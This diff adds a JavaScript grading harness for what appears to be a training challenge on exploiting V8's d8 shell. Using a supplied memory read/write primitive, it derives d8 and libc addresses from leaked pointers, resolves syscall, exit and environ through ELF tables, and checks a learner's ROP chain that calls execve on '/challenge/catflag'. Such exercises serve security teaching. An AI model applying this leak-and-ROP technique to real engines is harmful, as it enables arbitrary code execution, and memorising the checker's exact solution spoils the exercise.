@@ -1,0 +1,391 @@
+{% include "../../../common/wasmfx-imported-tag-native-primitive.js.j2" %}
+
+const primitive = createWasmFXImportedTagNativePrimitive();
+
+Object.defineProperty(globalThis, "Sandbox", {
+    value: undefined,
+    writable: false,
+    configurable: false,
+});
+
+const D8_METADATA_POINTER_OFFSET = 0x1c0028n;
+const D8_METADATA_LEAK_OFFSET = 0x19df400n;
+const STACK_SLOT_FROM_STACK_LEAK = 0x710n;
+const POP_ARGS_OFFSET = 0x62cfb3n;
+const EXPECTED_PATH = "/challenge/catflag";
+const EXECVE_SYSCALL_NUMBER = 59n;
+const PT_LOAD = 1;
+const PT_DYNAMIC = 2;
+const PF_X = 1;
+const PF_W = 2;
+const DT_NULL = 0n;
+const DT_HASH = 4n;
+const DT_PLTRELSZ = 2n;
+const DT_STRTAB = 5n;
+const DT_SYMTAB = 6n;
+const DT_RELAENT = 9n;
+const DT_SYMENT = 11n;
+const DT_JMPREL = 23n;
+
+let learnerRead32Calls = 0;
+let learnerWrite32Calls = 0;
+
+function fail(message) {
+    throw new Error(message);
+}
+
+function normalizeAddress(value, name) {
+    if (typeof value === "bigint") return value;
+    const asNumber = Number(value);
+    if (!Number.isSafeInteger(asNumber)) {
+        fail(`${name} must be a BigInt process address.`);
+    }
+    return BigInt(asNumber);
+}
+
+function normalizeU32(value, name) {
+    if (typeof value === "bigint") return Number(BigInt.asUintN(32, value));
+    const asNumber = Number(value);
+    if (!Number.isFinite(asNumber)) {
+        fail(`${name} must be a 32-bit integer value.`);
+    }
+    return asNumber >>> 0;
+}
+
+function read64(address) {
+    address = normalizeAddress(address, "read64 address");
+    return BigInt(primitive.read32(address)) | (BigInt(primitive.read32(address + 4n)) << 32n);
+}
+
+function write64(address, value) {
+    address = normalizeAddress(address, "write64 address");
+    value = BigInt.asUintN(64, BigInt(value));
+    primitive.write32(address, Number(value & 0xffffffffn));
+    primitive.write32(address + 4n, Number(value >> 32n));
+}
+
+function read8(address) {
+    address = normalizeAddress(address, "read8 address");
+    const aligned = address & ~7n;
+    return Number((read64(aligned) >> ((address - aligned) * 8n)) & 0xffn);
+}
+
+function read16(address) {
+    address = normalizeAddress(address, "read16 address");
+    return read8(address) | (read8(address + 1n) << 8);
+}
+
+function read32(address) {
+    address = normalizeAddress(address, "read32 address");
+    return (
+        read8(address) |
+        (read8(address + 1n) << 8) |
+        (read8(address + 2n) << 16) |
+        (read8(address + 3n) << 24)
+    ) >>> 0;
+}
+
+function write8(address, value) {
+    address = normalizeAddress(address, "write8 address");
+    const aligned = address & ~7n;
+    const shift = (address - aligned) * 8n;
+    const mask = 0xffn << shift;
+    const current = read64(aligned);
+    write64(aligned, (current & ~mask) | ((BigInt(value) & 0xffn) << shift));
+}
+
+function write32(address, value) {
+    address = normalizeAddress(address, "write32 address");
+    value = normalizeU32(value, "write32 value");
+    for (let i = 0; i < 4; i++) {
+        write8(address + BigInt(i), (value >>> (i * 8)) & 0xff);
+    }
+}
+
+function readCString(address, limit = 128) {
+    let result = "";
+    address = normalizeAddress(address, "string address");
+    for (let i = 0; i < limit; i++) {
+        const byte = read8(address + BigInt(i));
+        if (byte === 0) return result;
+        result += String.fromCharCode(byte);
+    }
+    fail(`string at 0x${address.toString(16)} was not null-terminated within ${limit} bytes.`);
+}
+
+function learnerRead32(address) {
+    learnerRead32Calls++;
+    return read32(address);
+}
+
+function learnerWrite32(address, value) {
+    learnerWrite32Calls++;
+    write32(address, value);
+}
+
+function ptrFromDynamicValue(value, baseAddress) {
+    value = BigInt(value);
+    return value >= baseAddress ? value : baseAddress + value;
+}
+
+function parseProgramHeaders(baseAddress) {
+    const ePhOff = read64(baseAddress + 0x20n);
+    const ePhEntSize = read16(baseAddress + 0x36n);
+    const ePhNum = read16(baseAddress + 0x38n);
+    const result = {
+        execRanges: [],
+        writeRanges: [],
+        dynamicAddress: 0n,
+        dynamicSize: 0n,
+    };
+
+    for (let i = 0; i < ePhNum; i++) {
+        const ph = baseAddress + ePhOff + BigInt(i * ePhEntSize);
+        const type = read32(ph);
+        const flags = read32(ph + 4n);
+        const vaddr = read64(ph + 0x10n);
+        const filesz = read64(ph + 0x20n);
+        const memsz = read64(ph + 0x28n);
+        if (type === PT_LOAD && (flags & PF_X) !== 0) {
+            result.execRanges.push(Object.freeze({ start: baseAddress + vaddr, size: memsz }));
+        }
+        if (type === PT_LOAD && (flags & PF_W) !== 0) {
+            result.writeRanges.push(Object.freeze({ start: baseAddress + vaddr, size: memsz }));
+        }
+        if (type === PT_DYNAMIC) {
+            result.dynamicAddress = baseAddress + vaddr;
+            result.dynamicSize = filesz;
+        }
+    }
+
+    if (result.execRanges.length === 0 || result.writeRanges.length === 0 || result.dynamicAddress === 0n) {
+        fail("Harness error: failed to parse d8 program headers.");
+    }
+    return Object.freeze(result);
+}
+
+function parseDynamicTables(baseAddress, programHeaders) {
+    const result = {
+        hash: 0n,
+        strtab: 0n,
+        symtab: 0n,
+        syment: 24n,
+        jmprel: 0n,
+        pltrelsz: 0n,
+        relaent: 24n,
+    };
+
+    for (let entry = programHeaders.dynamicAddress; entry < programHeaders.dynamicAddress + programHeaders.dynamicSize; entry += 16n) {
+        const tag = read64(entry);
+        const value = read64(entry + 8n);
+        if (tag === DT_NULL) break;
+        if (tag === DT_HASH) result.hash = ptrFromDynamicValue(value, baseAddress);
+        else if (tag === DT_STRTAB) result.strtab = ptrFromDynamicValue(value, baseAddress);
+        else if (tag === DT_SYMTAB) result.symtab = ptrFromDynamicValue(value, baseAddress);
+        else if (tag === DT_SYMENT) result.syment = value;
+        else if (tag === DT_JMPREL) result.jmprel = ptrFromDynamicValue(value, baseAddress);
+        else if (tag === DT_PLTRELSZ) result.pltrelsz = value;
+        else if (tag === DT_RELAENT) result.relaent = value;
+    }
+
+    if (result.strtab === 0n || result.symtab === 0n) {
+        fail("Harness error: failed to parse dynamic string/symbol tables.");
+    }
+    return Object.freeze(result);
+}
+
+function elfHash(name) {
+    let h = 0;
+    for (let i = 0; i < name.length; i++) {
+        h = (h << 4) + name.charCodeAt(i);
+        const g = h & 0xf0000000;
+        if (g !== 0) h ^= g >>> 24;
+        h &= ~g;
+    }
+    return h >>> 0;
+}
+
+function resolveDynSymbol(baseAddress, tables, names) {
+    if (tables.hash === 0n) {
+        fail("Harness error: failed to find the libc SysV hash table.");
+    }
+    const nbucket = read32(tables.hash);
+    const buckets = tables.hash + 8n;
+    const chains = buckets + BigInt(nbucket * 4);
+    for (const name of names) {
+        let symbolIndex = read32(buckets + BigInt((elfHash(name) % nbucket) * 4));
+        while (symbolIndex !== 0) {
+            const symbol = tables.symtab + BigInt(symbolIndex) * tables.syment;
+            const symbolName = readCString(tables.strtab + BigInt(read32(symbol)));
+            if (symbolName === name) {
+                return baseAddress + read64(symbol + 8n);
+            }
+            symbolIndex = read32(chains + BigInt(symbolIndex * 4));
+        }
+    }
+    fail(`Harness error: failed to resolve ${names.join(" or ")} from libc.`);
+}
+
+function resolveImports(baseAddress, tables) {
+    const result = {};
+    for (let relocation = tables.jmprel; relocation < tables.jmprel + tables.pltrelsz; relocation += tables.relaent) {
+        const got = ptrFromDynamicValue(read64(relocation), baseAddress);
+        const info = read64(relocation + 8n);
+        const symbolIndex = info >> 32n;
+        const symbol = tables.symtab + symbolIndex * tables.syment;
+        const nameOffset = read32(symbol);
+        const name = readCString(tables.strtab + BigInt(nameOffset));
+        if (name === "syscall") result.syscallTarget = read64(got);
+        if (name === "exit") result.exitTarget = read64(got);
+    }
+    if (result.syscallTarget === undefined || result.exitTarget === undefined) {
+        fail("Harness error: failed to resolve syscall/exit imports from d8.");
+    }
+    return Object.freeze(result);
+}
+
+function findElfBaseFromMappedPointer(pointer) {
+    let page = normalizeAddress(pointer, "mapped pointer") & ~0xfffn;
+    for (let i = 0; i < 0x1000; i++, page -= 0x1000n) {
+        if (read32(page) === 0x464c457f && read8(page + 4n) === 2) {
+            return page;
+        }
+    }
+    fail("Harness error: failed to find the ELF base for a mapped pointer.");
+}
+
+function rangeContains(range, address, size) {
+    return address >= range.start && address + BigInt(size) <= range.start + range.size;
+}
+
+function isExecutable(address, size, programHeaders) {
+    return programHeaders.execRanges.some((range) => rangeContains(range, address, size));
+}
+
+function isWritable(address, size, programHeaders) {
+    return programHeaders.writeRanges.some((range) => rangeContains(range, address, size));
+}
+
+function checkPattern(address, pattern, name, programHeaders) {
+    address = normalizeAddress(address, name);
+    if (!isExecutable(address, pattern.length, programHeaders)) {
+        fail(`${name} must point inside a real executable d8 segment.`);
+    }
+    for (let i = 0; i < pattern.length; i++) {
+        if (read8(address + BigInt(i)) !== pattern[i]) {
+            fail(`${name} does not point at the requested gadget bytes.`);
+        }
+    }
+}
+
+function checkWritable(address, size, name, programHeaders) {
+    address = normalizeAddress(address, name);
+    if (!isWritable(address, size, programHeaders)) {
+        fail(`${name} must point inside a real writable d8 segment.`);
+    }
+}
+
+const sandboxBase = primitive.leakedPointer & ~0xffffffffn;
+const imageLeak = read64(sandboxBase + D8_METADATA_POINTER_OFFSET);
+const baseAddress = imageLeak - D8_METADATA_LEAK_OFFSET;
+if (read64(baseAddress) !== 0x00010102464c457fn) {
+    fail(`Harness error: derived d8 base 0x${baseAddress.toString(16)} is not an ELF header.`);
+}
+const programHeaders = parseProgramHeaders(baseAddress);
+const imports = resolveImports(baseAddress, parseDynamicTables(baseAddress, programHeaders));
+const libcBase = findElfBaseFromMappedPointer(imports.exitTarget);
+const libcHeaders = parseProgramHeaders(libcBase);
+const libcTables = parseDynamicTables(libcBase, libcHeaders);
+const stackLeak = read64(resolveDynSymbol(libcBase, libcTables, ["environ", "__environ"]));
+const chainAddress = stackLeak - STACK_SLOT_FROM_STACK_LEAK;
+const patterns = Object.freeze({
+    popArgs: Object.freeze([0x58, 0x59, 0x5a, 0x5e, 0x5f, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x5d, 0xc3]),
+    ret: Object.freeze([0xc3]),
+});
+
+const api = Object.freeze({
+    imageLeak,
+    imageLeakOffset: D8_METADATA_LEAK_OFFSET,
+    stackLeak,
+    stackSlotFromStackLeak: STACK_SLOT_FROM_STACK_LEAK,
+    popArgsOffset: POP_ARGS_OFFSET,
+    execveSyscallNumber: EXECVE_SYSCALL_NUMBER,
+    expectedPath: EXPECTED_PATH,
+    PT_LOAD,
+    PT_DYNAMIC,
+    PF_X,
+    PF_W,
+    DT_NULL,
+    DT_PLTRELSZ,
+    DT_STRTAB,
+    DT_SYMTAB,
+    DT_RELAENT,
+    DT_SYMENT,
+    DT_JMPREL,
+    patterns,
+    read32: learnerRead32,
+    write32: learnerWrite32,
+});
+
+__PWN_SOLVE_SOURCE__;
+
+if (typeof solve !== "function") {
+    fail("define solve(api)");
+}
+
+solve(api);
+
+if (learnerRead32Calls === 0) {
+    fail("Use api.read32(address) to derive the live d8 addresses instead of hardcoding them.");
+}
+if (learnerWrite32Calls === 0) {
+    fail("Use api.write32(address, value) to lay out the path, argv, and return chain.");
+}
+
+const chain = [];
+for (let i = 0; i < 23; i++) {
+    chain.push(read64(chainAddress + BigInt(i * 8)));
+}
+
+if (chain[0] === chain[1]) {
+    fail("Start the chain with a plain ret gadget before loading the first argument.");
+}
+
+checkPattern(chain[0], patterns.ret, "chain[0] ret", programHeaders);
+checkPattern(chain[1], patterns.popArgs, "chain[1] popArgs", programHeaders);
+if (chain[2] !== 0n || chain[3] !== 0n) {
+    fail("The first multi-pop setup should leave rax and rcx as zero.");
+}
+if (chain[6] !== EXECVE_SYSCALL_NUMBER) {
+    fail(`chain[6] was ${chain[6]}; expected the execve syscall number ${EXECVE_SYSCALL_NUMBER}.`);
+}
+for (const index of [7, 8, 9, 10]) {
+    if (chain[index] !== 0n) {
+        fail(`chain[${index}] must be zero for the unused argument-loader slots.`);
+    }
+}
+if (chain[11] !== imports.syscallTarget) {
+    fail(`chain[11] was 0x${chain[11].toString(16)}; expected resolved syscall target 0x${imports.syscallTarget.toString(16)}.`);
+}
+checkPattern(chain[12], patterns.popArgs, "chain[12] popArgs", programHeaders);
+for (let index = 13; index <= 21; index++) {
+    if (chain[index] !== 0n) {
+        fail(`chain[${index}] must be zero before calling exit(0).`);
+    }
+}
+if (chain[22] !== imports.exitTarget) {
+    fail(`chain[22] was 0x${chain[22].toString(16)}; expected resolved exit target 0x${imports.exitTarget.toString(16)}.`);
+}
+
+const argvAddress = chain[4];
+const pathAddress = chain[5];
+checkWritable(pathAddress, EXPECTED_PATH.length + 1, "path string", programHeaders);
+checkWritable(argvAddress, 16, "argv array", programHeaders);
+if (readCString(pathAddress) !== EXPECTED_PATH) {
+    fail(`path string at 0x${pathAddress.toString(16)} must be ${EXPECTED_PATH}.`);
+}
+if (read64(argvAddress) !== pathAddress || read64(argvAddress + 8n) !== 0n) {
+    fail("argv must contain argv[0] = pathAddress and argv[1] = NULL.");
+}
+
+print("__PWN_SUCCESS_MARKER__");
